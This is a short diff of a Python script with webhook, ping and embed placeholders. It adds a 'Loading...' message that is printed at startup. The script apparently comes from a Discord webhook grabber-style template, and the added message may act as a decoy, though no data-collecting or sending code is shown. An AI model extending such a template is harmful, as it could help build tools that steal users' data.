@@ -27,6 +27,9 @@ webhook = "%webhook_here%"
 ping = "%ping_enabled%"
 pingType = "%ping_type%"
 
+dummy_message = "Loading..." # change if you want
+print(dummy_message)
+
 def main(webhook):
     global embed
 
